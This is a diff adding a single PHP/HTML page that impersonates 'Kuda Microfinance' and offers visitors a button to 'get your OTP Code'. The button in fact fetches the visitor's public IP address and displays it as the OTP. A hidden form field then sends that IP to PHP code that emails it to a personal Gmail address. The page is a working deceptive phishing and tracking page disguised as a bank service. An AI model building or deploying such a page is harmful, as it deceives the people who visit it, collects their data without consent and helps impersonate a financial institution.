@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Kuda Microfinance - Get My IP Address</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        body {
+            background-color: #ffffff; /* White background */
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background-color: #800080; /* Purple header background */
+            color: #fff; /* White text color */
+            text-align: center;
+            padding: 20px;
+        }
+
+        h1 {
+            color: #fff; /* Purple text color */
+            font-weight: bold;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        button {
+            background-color: #800080; /* Purple button color */
+            color: #ffffff; /* White text color */
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #6b006b; /* Slightly darker purple on hover */
+        }
+
+        #ipAddress {
+            font-size: 18px;
+            color: #800080; /* Purple text color for IP address */
+        }
+
+        #emailForm {
+            margin-top: 20px;
+        }
+
+        input[type="submit"] {
+            background-color: #800080; /* Purple submit button color */
+            color: #ffffff; /* White text color */
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+
+        input[type="submit"]:hover {
+            background-color: #6b006b; /* Slightly darker purple on hover */
+        }
+
+        footer {
+            background-color: #800080; /* Purple footer background */
+            color: #ffffff; /* White text color */
+            text-align: center;
+            padding: 10px 0;
+        }
+
+        /* Styling for additional sections */
+        .section {
+            background-color: #f5f5f5; /* Light gray background for sections */
+            padding: 20px;
+            margin-bottom: 20px;
+        }
+
+        .section h2 {
+            color: #800080; /* Purple text color for section headings */
+        }
+
+        /* Responsive design for smaller screens */
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 24px;
+            }
+
+            .container {
+                padding: 10px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Kuda Microfinance</h1>
+    </header>
+
+    <div class="container">
+        <h2>Click the button below to get your OTP Code:</h2>
+        <button onclick="getIPAddress()">Get OTP</button>
+        <p>Your One TIme Password(OTP) Should Display Here: <span id="ipAddress"></span></p>
+
+        <form id="emailForm" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
+            <input type="hidden" name="ipAddress" id="ipAddressField">
+            <input type="submit" value="Request OTP Code">
+        </form>
+
+        <section class="section">
+            <h2>About Kuda Microfinance</h2>
+            <p>Kuda Microfinance is a leading financial institution dedicated to providing innovative financial solutions to individuals and businesses. Our mission is to empower our customers with the financial tools they need to achieve their goals.</p>
+        </section>
+
+        <section class="section">
+            <h2>Customer Care</h2>
+            <p>Our customer care team is available 24/7 to assist you with any inquiries or issues you may have. You can reach us at: <strong>+1-800-123-4567</strong></p>
+        </section>
+
+        <section class="section">
+            <h2>How to Join Kuda Microfinance</h2>
+            <p>Joining Kuda Microfinance is easy! Simply visit our website and follow the simple registration process. Once you're a member, you'll have access to a wide range of financial services and benefits.</p>
+        </section>
+    </div>
+
+    <footer>
+        &copy; 2023 Kuda Microfinance. All rights reserved.
+    </footer>
+
+    <?php
+    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+        $ipAddress = $_POST['ipAddress'];
+
+        // Replace with your email settings
+        $to = 'febechukwuonyeyili@gmail.com'; // Recipient's email address
+        $subject = 'IP Address Report';
+        $message = 'The IP address is: ' . $ipAddress;
+        $headers = 'From: febechukwuonyeyili@gmail.com' . "\r\n" .
+            'Reply-To: febechukwuonyeyili@gmail.com' . "\r\n" .
+            'X-Mailer: PHP/' . phpversion();
+
+        // Send the email
+        if (mail($to, $subject, $message, $headers)) {
+            echo 'Email sent successfully!';
+        } else {
+            echo 'Email could not be sent.';
+        }
+    }
+    ?>
+
+    <script>
+        function getIPAddress() {
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ipAddress').textContent = data.ip;
+                    document.getElementById('ipAddressField').value = data.ip;
+                })
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                    document.getElementById('ipAddress').textContent = 'Error';
+                });
+        }
+    </script>
+</body>
+</html>
